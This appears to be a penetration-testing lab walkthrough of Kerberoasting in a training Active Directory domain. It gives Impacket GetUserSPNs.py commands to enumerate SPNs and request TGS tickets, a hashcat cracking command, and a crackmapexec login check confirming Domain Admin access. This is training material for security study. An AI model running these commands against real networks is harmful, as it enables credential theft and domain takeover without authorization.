

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to `MSSQL/SRV01`, we can access the MSSQL service as sysadmin, enable the `xp_cmdshell` extended procedure and gain code execution on the target SQL server.

For an interesting look at the origin of this technique, check out the talk Tim Medin gave at Derbycon 2014, showcasing Kerberoasting to the world.

---

## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using `runas /netonly`.

Several tools can be utilized to perform the attack:

- Impacket’s `GetUserSPNs.py` from a non-domain joined Linux host.
- A combination of the built-in `setspn.exe` Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.

Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

---

## Efficacy of the Attack

While it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access. We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.

I would likely write up the finding as high-risk in my report in the first two cases. In the third case, we may Kerberoast and end up unable to crack a single TGS ticket, even after days of cracking attempts with Hashcat on a powerful GPU password cracking rig. In this scenario, I would still write up the finding, but I would drop it down to a medium-risk issue to make the client aware of the risk of SPNs in the domain (these strong passwords could always be changed to something weaker or a very determined attacker may be able to crack the tickets using Hashcat), but take into account the fact that I was unable to take control of any domain accounts using the attack. It is vital to make these types of distinctions in our reports and know when it's ok to lower the risk of a finding when mitigating controls (such as very strong passwords) are in place.

---

## Performing the Attack

Kerberoasting attacks are easily done now using automated tools and scripts. We will cover performing this attack in various ways, both from a Linux and a Windows attack host. Let's first go through how to do this from a Linux host. The following section will walk through a "semi-manual" way of performing the attack and two quick, automated attacks using common open-source tools, all from a Windows attack host.

---

### Kerberoasting with GetUserSPNs.py

A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.

Let's start by installing the Impacket toolkit, which we can grab from Here. After cloning the repository, we can cd into the directory and install it as follows:

#### Installing Impacket using Pip

```shell
LeDaav@htb[/htb]$ sudo python3 -m pip install .
````

<details> <summary>Exemple de sortie</summary>

```


Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)
...
```

</details>

This will install all Impacket tools and place them in our PATH so we can call them from any directory on our attack host. Impacket is already installed on the attack host that we can spawn at the end of this section to follow along and work through the exercises. Running the tool with the `-h` flag will bring up the help menu.

#### Listing GetUserSPNs.py Help Options

```shell
shell

LeDaav@htb[/htb]$ GetUserSPNs.py -h
```

<details> <summary>Exemple de sortie</summary>

```


Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN]
                      [-usersfile USERSFILE] [-request]
                      [-request-user username] [-save]
                      [-outputfile OUTPUTFILE] [-debug]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]
...
```

</details>

---

### Listing SPN Accounts with GetUserSPNs.py

We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.

```shell
shell

LeDaav@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```


```
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
...
```

---

### Requesting all TGS Tickets

```shell
shell

LeDaav@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

This will output TGS tickets in a format ready for Hashcat or John the Ripper.

---

### Requesting a Single TGS Ticket

```shell
shell

LeDaav@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

---

### Saving the TGS Ticket to an Output File

```shell
shell

LeDaav@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

---

### Cracking the Ticket Offline with Hashcat

```shell
shell

LeDaav@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

<details> <summary>Exemple de sortie</summary>

```


Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
...
Candidates.#1....: davius07 -> darten170
...
```

</details>

---

### Testing Authentication against a Domain Controller

```shell
shell

LeDaav@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

<details> <summary>Exemple de sortie</summary>

```


SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

</details>

---

We’ve successfully cracked the user's password as `database!`. As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.